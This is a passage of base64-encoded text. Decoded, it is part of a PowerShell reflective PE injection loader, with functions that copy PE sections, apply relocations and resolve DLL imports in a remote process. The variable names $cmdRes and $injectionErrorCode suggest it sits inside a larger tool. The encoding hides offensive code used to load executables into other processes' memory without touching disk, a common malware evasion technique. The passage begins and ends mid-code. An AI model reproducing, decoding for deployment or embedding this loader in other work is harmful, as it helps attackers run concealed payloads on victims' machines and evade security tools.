LCAkUlNDQWRkciwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGw7DQoJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRHZXRQcm9jQWRkcmVzc1JldE1lbSwgW1VJbnRQdHJdW1VJbnQ2NF0wLCAkV2luMzJDb25zdGFudHMuTUVNX1JFTEVBU0UpIHwgT3V0LU51bGw7DQoJCQlpZiAoLW5vdCAkTG9hZEJ5T3JkaW5hbCkNCgkJCXsNCgkJCQkkV2luMzJGdW5jdGlvbnMuVmlydHVhbEZyZWVFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSRnVuY05hbWVQdHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsOw0KCQkJfQ0KCQkJcmV0dXJuICRQcm9jQWRkcmVzczsNCgkJfQ0KCQlGdW5jdGlvbiBDb3B5LVNlY3Rpb25zDQoJCXsNCgkJCVBhcmFtICgNCgkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQlbQnl0ZVtdXSRQRUJ5dGVzLA0KCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCVtTeXN0ZW0uT2JqZWN0XSRQRUluZm8sDQoJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyRnVuY3Rpb25zLA0KCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCVtTeXN0ZW0uT2JqZWN0XSRXaW4zMlR5cGVzDQoJCQkpDQoJCQlmb3IgKCRpID0gMDsgJGkgLWx0ICRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLk51bWJlck9mU2VjdGlvbnM7ICRpKyspDQoJCQl7DQoJCQkJW0ludFB0cl0kU2VjdGlvbkhlYWRlclB0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5TZWN0aW9uSGVhZGVyUHRyKSAoJGkgKiBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfU0VDVElPTl9IRUFERVIpKSk7DQoJCQkJJFNlY3Rpb25IZWFkZXIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkU2VjdGlvbkhlYWRlclB0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfU0VDVElPTl9IRUFERVIpOw0KCQkJCVtJbnRQdHJdJFNlY3Rpb25EZXN0QWRkciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kU2VjdGlvbkhlYWRlci5WaXJ0dWFsQWRkcmVzcykpOw0KCQkJCSRTaXplT2ZSYXdEYXRhID0gJFNlY3Rpb25IZWFkZXIuU2l6ZU9mUmF3RGF0YTsNCgkJCQlpZiAoJFNlY3Rpb25IZWFkZXIuUG9pbnRlclRvUmF3RGF0YSAtZXEgMCkNCgkJCQl7DQoJCQkJCSRTaXplT2ZSYXdEYXRhID0gMDsNCgkJCQl9DQoJCQkJaWYgKCRTaXplT2ZSYXdEYXRhIC1ndCAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZSkNCgkJCQl7DQoJCQkJCSRTaXplT2ZSYXdEYXRhID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemU7DQoJCQkJfQ0KCQkJCWlmICgkU2l6ZU9mUmF3RGF0YSAtZ3QgMCkNCgkJCQl7DQoJCQkJCVRlc3QtTWVtb3J5UmFuZ2VWYWxpZCAtRGVidWdTdHJpbmcgIkNvcHktU2VjdGlvbnM6Ok1hcnNoYWxDb3B5IiAtUEVJbmZvICRQRUluZm8gLVN0YXJ0QWRkcmVzcyAkU2VjdGlvbkRlc3RBZGRyIC1TaXplICRTaXplT2ZSYXdEYXRhIHwgT3V0LU51bGw7DQoJCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBFQnl0ZXMsIFtJbnQzMl0kU2VjdGlvbkhlYWRlci5Qb2ludGVyVG9SYXdEYXRhLCAkU2VjdGlvbkRlc3RBZGRyLCAkU2l6ZU9mUmF3RGF0YSk7DQoJCQkJfQ0KCQkJCWlmICgkU2VjdGlvbkhlYWRlci5TaXplT2ZSYXdEYXRhIC1sdCAkU2VjdGlvbkhlYWRlci5WaXJ0dWFsU2l6ZSkNCgkJCQl7DQoJCQkJCSREaWZmZXJlbmNlID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUgLSAkU2l6ZU9mUmF3RGF0YTsNCgkJCQkJW0ludFB0cl0kU3RhcnRBZGRyZXNzID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kU2VjdGlvbkRlc3RBZGRyKSAoW0ludDY0XSRTaXplT2ZSYXdEYXRhKSk7DQoJCQkJCVRlc3QtTWVtb3J5UmFuZ2VWYWxpZCAtRGVidWdTdHJpbmcgIkNvcHktU2VjdGlvbnM6Ok1lbXNldCIgLVBFSW5mbyAkUEVJbmZvIC1TdGFydEFkZHJlc3MgJFN0YXJ0QWRkcmVzcyAtU2l6ZSAkRGlmZmVyZW5jZSB8IE91dC1OdWxsOw0KCQkJCQkkV2luMzJGdW5jdGlvbnMubWVtc2V0Lkludm9rZSgkU3RhcnRBZGRyZXNzLCAwLCBbSW50UHRyXSREaWZmZXJlbmNlKSB8IE91dC1OdWxsOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQlGdW5jdGlvbiBVcGRhdGUtTWVtb3J5QWRkcmVzc2VzDQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtTeXN0ZW0uT2JqZWN0XSRQRUluZm8sDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbSW50NjRdJE9yaWdpbmFsSW1hZ2VCYXNlLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyQ29uc3RhbnRzLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyVHlwZXMNCgkJCSkNCgkJCVtJbnQ2NF0kQmFzZURpZmZlcmVuY2UgPSAwOw0KCQkJJEFkZERpZmZlcmVuY2UgPSAkdHJ1ZTsNCgkJCVtVSW50MzJdJEltYWdlQmFzZVJlbG9jU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9CQVNFX1JFTE9DQVRJT04pOw0KCQkJaWYgKCgkT3JpZ2luYWxJbWFnZUJhc2UgLWVxIFtJbnQ2NF0kUEVJbmZvLkVmZmVjdGl2ZVBFSGFuZGxlKSBgDQoJCQktb3IgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5CYXNlUmVsb2NhdGlvblRhYmxlLlNpemUgLWVxIDApKQ0KCQkJew0KCQkJCXJldHVybjsNCgkJCX0NCgkJCWVsc2VpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJE9yaWdpbmFsSW1hZ2VCYXNlKSAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkpIC1lcSAkdHJ1ZSkNCgkJCXsNCgkJCQkkQmFzZURpZmZlcmVuY2UgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAoJE9yaWdpbmFsSW1hZ2VCYXNlKSAoJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSk7DQoJCQkJJEFkZERpZmZlcmVuY2UgPSAkZmFsc2U7DQoJCQl9DQoJCQllbHNlaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpICgkT3JpZ2luYWxJbWFnZUJhc2UpKSAtZXEgJHRydWUpDQoJCQl7DQoJCQkJJEJhc2VEaWZmZXJlbmNlID0gU3ViLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpICgkT3JpZ2luYWxJbWFnZUJhc2UpOw0KCQkJfQ0KCQkJW0ludFB0cl0kQmFzZVJlbG9jUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlBFSGFuZGxlKSAoW0ludDY0XSRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5CYXNlUmVsb2NhdGlvblRhYmxlLlZpcnR1YWxBZGRyZXNzKSk7DQoJCQl3aGlsZSAoJHRydWUpDQoJCQl7DQoJCQkJJEJhc2VSZWxvY2F0aW9uVGFibGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkQmFzZVJlbG9jUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9CQVNFX1JFTE9DQVRJT04pOw0KCQkJCWlmICgkQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jayAtZXEgMCkNCgkJCQl7DQoJCQkJCWJyZWFrOw0KCQkJCX0NCgkJCQlbSW50UHRyXSRNZW1BZGRyQmFzZSA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kQmFzZVJlbG9jYXRpb25UYWJsZS5WaXJ0dWFsQWRkcmVzcykpOw0KCQkJCSROdW1SZWxvY2F0aW9ucyA9ICgkQmFzZVJlbG9jYXRpb25UYWJsZS5TaXplT2ZCbG9jayAtICRJbWFnZUJhc2VSZWxvY1NpemUpIC8gMjsNCgkJCQlmb3IgKCRpID0gMDsgJGkgLWx0ICROdW1SZWxvY2F0aW9uczsgJGkrKykNCgkJCQl7DQoJCQkJCSRSZWxvY2F0aW9uSW5mb1B0ciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50UHRyXSRCYXNlUmVsb2NQdHIpIChbSW50NjRdJEltYWdlQmFzZVJlbG9jU2l6ZSArICgyICogJGkpKSk7DQoJCQkJCVtVSW50MTZdJFJlbG9jYXRpb25JbmZvID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFJlbG9jYXRpb25JbmZvUHRyLCBbVHlwZV1bVUludDE2XSk7DQoJCQkJCVtVSW50MTZdJFJlbG9jT2Zmc2V0ID0gJFJlbG9jYXRpb25JbmZvIC1iYW5kIDB4MEZGRjsNCgkJCQkJW1VJbnQxNl0kUmVsb2NUeXBlID0gJFJlbG9jYXRpb25JbmZvIC1iYW5kIDB4RjAwMDsNCgkJCQkJZm9yICgkaiA9IDA7ICRqIC1sdCAxMjsgJGorKykNCgkJCQkJew0KCQkJCQkJJFJlbG9jVHlwZSA9IFtNYXRoXTo6Rmxvb3IoJFJlbG9jVHlwZSAvIDIpOw0KCQkJCQl9DQoJCQkJCWlmICgoJFJlbG9jVHlwZSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1JFTF9CQVNFRF9ISUdITE9XKSBgDQoJCQkJCS1vciAoJFJlbG9jVHlwZSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1JFTF9CQVNFRF9ESVI2NCkpDQoJCQkJCXsNCgkJCQkJCVtJbnRQdHJdJEZpbmFsQWRkciA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJE1lbUFkZHJCYXNlKSAoW0ludDY0XSRSZWxvY09mZnNldCkpOw0KCQkJCQkJW0ludFB0cl0kQ3VyckFkZHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkRmluYWxBZGRyLCBbVHlwZV1bSW50UHRyXSk7DQoJCQkJCQlpZiAoJEFkZERpZmZlcmVuY2UgLWVxICR0cnVlKQ0KCQkJCQkJew0KCQkJCQkJCVtJbnRQdHJdJEN1cnJBZGRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQ3VyckFkZHIpICgkQmFzZURpZmZlcmVuY2UpKTsNCgkJCQkJCX0NCgkJCQkJCWVsc2UNCgkJCQkJCXsNCgkJCQkJCQlbSW50UHRyXSRDdXJyQWRkciA9IFtJbnRQdHJdKFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJEN1cnJBZGRyKSAoJEJhc2VEaWZmZXJlbmNlKSk7DQoJCQkJCQl9DQoJCQkJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkQ3VyckFkZHIsICRGaW5hbEFkZHIsICRmYWxzZSkgfCBPdXQtTnVsbDsNCgkJCQkJfQ0KCQkJCQllbHNlaWYgKCRSZWxvY1R5cGUgLW5lICRXaW4zMkNvbnN0YW50cy5JTUFHRV9SRUxfQkFTRURfQUJTT0xVVEUpDQoJCQkJCXsNCgkJCQkJCSRjbWRSZXMuVmFsdWUgPSAzNDsNCgkJCQkJCSRpbmplY3Rpb25FcnJvckNvZGUuVmFsdWUgPSAkUmVsb2NhdGlvbkluZm8uVG9TdHJpbmcoKTsNCgkJCQkJCXRocm93ICJVbmtub3duIHJlbG9jYXRpb24gZm91bmQsIHJlbG9jYXRpb24gdmFsdWU6ICRSZWxvY1R5cGUsIHJlbG9jYXRpb25pbmZvOiAkUmVsb2NhdGlvbkluZm8iOw0KCQkJCQl9DQoJCQkJfQ0KCQkJCSRCYXNlUmVsb2NQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRCYXNlUmVsb2NQdHIpIChbSW50NjRdJEJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZU9mQmxvY2spKTsNCgkJCX0NCgkJfQ0KCQlGdW5jdGlvbiBJbXBvcnQtRGxsSW1wb3J0cw0KCQl7DQoJCQlQYXJhbSAoDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kUEVJbmZvLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyRnVuY3Rpb25zLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFdpbjMyVHlwZXMsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbU3lzdGVtLk9iamVjdF0kV2luMzJDb25zdGFudHMsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRmYWxzZSldDQoJCQkJW0ludFB0cl0kUmVtb3RlUHJvY0hhbmRsZQ0KCQkJKQ0KCQkJJFJlbW90ZUxvYWRpbmcgPSAkZmFsc2U7DQoJCQlpZiAoJFBFSW5mby5QRUhhbmRsZSAtbmUgJFBFSW5mby5FZmZlY3RpdmVQRUhhbmRsZSkNCgkJCXsNCgkJCQkkUmVtb3RlTG9hZGluZyA9ICR0cnVlOw0KCQkJfQ0KCQkJaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5TaXplIC1ndCAwKQ0KCQkJew0KCQkJCVtJbnRQdHJdJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlZpcnR1YWxBZGRyZXNzKTsNCgkJCQl3aGlsZSAoJHRydWUpDQoJCQkJew0KCQkJCQkkSW1wb3J0RGVzY3JpcHRvciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRJbXBvcnREZXNjcmlwdG9yUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUik7DQoJCQkJCWlmICgkSW1wb3J0RGVzY3JpcHRvci5DaGFyYWN0ZXJpc3RpY3MgLWVxIDAgYA0KCQkJCQktYW5kICRJbXBvcnREZXNjcmlwdG9yLkZpcnN0VGh1bmsgLWVxIDAgYA0KCQkJCQktYW5kICRJbXBvcnREZXNjcmlwdG9yLkZvcndhcmRlckNoYWluIC1lcSAwIGANCgkJCQkJLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5OYW1lIC1lcSAwIGANCgkJCQkJLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5UaW1lRGF0ZVN0YW1wIC1lcSAwKQ0KCQkJCQl7DQoJCQkJCQlicmVhazsNCgkJCQkJfQ0KCQkJCQkkSW1wb3J0RGxsSGFuZGxlID0gW0ludFB0cl06Olplcm87DQoJCQkJCSRJbXBvcnREbGxQYXRoUHRyID0gKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kSW1wb3J0RGVzY3JpcHRvci5OYW1lKSk7DQoJCQkJCSRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRJbXBvcnREbGxQYXRoUHRyKTsNCgkJCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkNCgkJCQkJew0KCQkJCQkJJEltcG9ydERsbEhhbmRsZSA9IEltcG9ydC1EbGxJblJlbW90ZVByb2Nlc3MgLVJlbW90ZVByb2NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLUltcG9ydERsbFBhdGhQdHIgJEltcG9ydERsbFBhdGhQdHI7DQoJCQkJCX0NCgkJCQkJZWxzZQ0KCQkJCQl7DQoJCQkJCQkkSW1wb3J0RGxsSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkxvYWRMaWJyYXJ5Lkludm9rZSgkSW1wb3J0RGxsUGF0aCk7DQoJCQkJCX0NCgkJCQkJaWYgKCgkSW1wb3J0RGxsSGFuZGxlIC1lcSAkbnVsbCkgLW9yICgkSW1wb3J0RGxsSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykpDQoJCQkJCXsNCgkJCQkJCSRjbWRSZXMuVmFsdWUgPSAzNTsNCgkJCQkJCSRpbmplY3Rpb25FcnJvckNvZGUuVmFsdWUgPSAkRXJyb3JDb2RlLlRvU3RyaW5nKCk7DQoJCQkJCQl0aHJvdyAiRXJyb3IgaW1wb3J0aW5nIERMTCwgRExMTmFtZTogJEltcG9ydERsbFBhdGgiOw0KCQkJCQl9DQoJCQkJCVtJbnRQdHJdJFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkSW1wb3J0RGVzY3JpcHRvci5GaXJzdFRodW5rKTsNCgkJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJEltcG9ydERlc2NyaXB0b3IuQ2hhcmFjdGVyaXN0aWNzKTsNCgkJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPcmlnaW5hbFRodW5rUmVmLCBbVHlwZV1bSW50UHRyXSk7DQoJCQkJCXdoaWxlICgkT3JpZ2luYWxUaHVua1JlZlZhbCAtbmUgW0ludFB0cl06Olplcm8pDQoJCQkJCXsNCgkJCQkJCSRMb2FkQnlPcmRpbmFsID0gJGZhbHNlOw0KCQkJCQkJW0ludFB0cl0kUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvOw0KCQkJCQkJW0ludFB0cl0kTmV3VGh1bmtSZWYgPSBbSW50UHRyXTo6WmVybzsNCgkJCQkJCWlmIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pIC1lcSA0IC1hbmQgW0ludDMyXSRPcmlnaW5hbFRodW5rUmVmVmFsIC1sdCAwKQ0KCQkJCQkJew0KCQkJCQkJCVtJbnRQdHJdJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZjsNCgkJCQkJCQkkTG9hZEJ5T3JkaW5hbCA9ICR0cnVlOw0KCQkJCQkJfQ0KCQkJCQkJZWxzZWlmIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pIC1lcSA4IC1hbmQgW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmVmFsIC1sdCAwKQ0KCQkJCQkJew0KCQkJCQkJCVtJbnRQdHJdJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50NjRdJE9yaWdpbmFsVGh1bmtSZWZWYWwgLWJhbmQgMHhmZmZmOw0KCQkJCQkJCSRMb2FkQnlPcmRpbmFsID0gJHRydWU7DQoJCQkJCQl9DQoJCQkJCQllbHNlDQoJCQkJCQl7DQoJCQkJCQkJW0ludFB0cl0kU3RyaW5nQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwpOw0KCQkJCQkJCSRTdHJpbmdBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFN0cmluZ0FkZHIgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDE2XSkpOw0KCQkJCQkJCSRQcm9jZWR1cmVOYW1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRTdHJpbmdBZGRyKTsNCgkJCQkJCQkkUHJvY2VkdXJlTmFtZVB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJFByb2NlZHVyZU5hbWUpOw0KCQkJCQkJfQ0KCQkJCQkJaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkNCgkJCQkJCXsNCgkJCQkJCQlbSW50UHRyXSROZXdUaHVua1JlZiA9IEdldC1SZW1vdGVQcm9jQWRkcmVzcyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtUmVtb3RlRGxsSGFuZGxlICRJbXBvcnREbGxIYW5kbGUgLUZ1bmN0aW9uTmFtZVB0ciAkUHJvY2VkdXJlTmFtZVB0ciAtTG9hZEJ5T3JkaW5hbCAkTG9hZEJ5T3JkaW5hbDsNCgkJCQkJCX0NCgkJCQkJCWVsc2UNCgkJCQkJCXsNCgkJCQkJCQlbSW50UHRyXSROZXdUaHVua1JlZiA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzc0ludFB0ci5JbnZva2UoJEltcG9ydERsbEhhbmRsZSwgJFByb2NlZHVyZU5hbWVQdHIpOw0KCQkJCQkJfQ0KCQkJCQkJaWYgKCROZXdUaHVua1JlZiAtZXEgJG51bGwgLW9yICROZXdUaHVua1JlZiAtZXEgW0ludFB0cl06Olplcm8pDQoJCQkJCQl7DQoJCQkJCQkJaWYgKCRMb2FkQnlPcmRpbmFsKQ0KCQkJCQkJCXsNCgkJCQkJCQkJJGNtZFJlcy5WYWx1ZSA9IDM2Ow0KCQkJCQkJCQl0aHJvdyAiTmV3IGZ1bmN0aW9uIHJlZmVyZW5jZSBpcyBudWxsLCB0aGlzIGlzIGFsbW9zdCBjZXJ0YWlubHkgYSBidWcgaW4gdGhpcyBzY3JpcHQuIEZ1bmN0aW9uIE9yZGluYWw6ICRQcm9jZWR1cmVOYW1lUHRyLiBEbGw6ICRJbXBvcnREbGxQYXRoIjsNCgkJCQkJCQl9DQoJCQkJCQkJZWxzZQ0KCQkJCQkJCXsNCgkJCQkJCQkJJGNtZFJlcy5WYWx1ZSA9IDM3Ow0KCQkJCQkJCQl0aHJvdyAiTmV3IGZ1bmN0aW9uIHJlZmVyZW5jZSBpcyBudWxsLCB0aGlzIGlzIGFsbW9zdCBjZXJ0YWlubHkgYSBidWcgaW4gdGhpcyBzY3JpcHQuIEZ1bmN0aW9uOiAkUHJvY2VkdXJlTmFtZS4gRGxsOiAkSW1wb3J0RGxsUGF0aCI7DQoJCQkJCQkJfQ0KCQkJCQkJfQ0KCQkJCQkJW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJE5ld1RodW5rUmVmLCAkVGh1bmtSZWYsICRmYWxzZSk7DQoJCQkJCQkkVGh1bmtSZWYgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRUaHVua1JlZikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkpOw0KCQkJCQkJW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJE9yaWdpbmFsVGh1bmtSZWYpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pKTsNCgkJCQkJCVtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWZWYWwgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkT3JpZ2luYWxUaHVua1JlZiwgW1R5cGVdW0ludFB0cl0pOw0KCQkJCQkJaWYgKCgtbm90ICRMb2FkQnlPcmRpbmFsKSAtYW5kICgkUHJvY2VkdXJlTmFtZVB0ciAtbmUgW0ludFB0cl06Olplcm8pKQ0KCQkJCQkJew0KCQkJCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRQcm9jZWR1cmVOYW1lUHRyKTsNCgkJCQkJCQkkUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvOw0KCQkJCQkJfQ0KCQkJCQl9DQoJCQkJCSRJbXBvcnREZXNjcmlwdG9yUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRJbXBvcnREZXNjcmlwdG9yUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0lNUE9SVF9ERVNDUklQVE9SKSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCUZ1bmN0aW9uIEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlDQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtVSW50MzJdJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MNCgkJ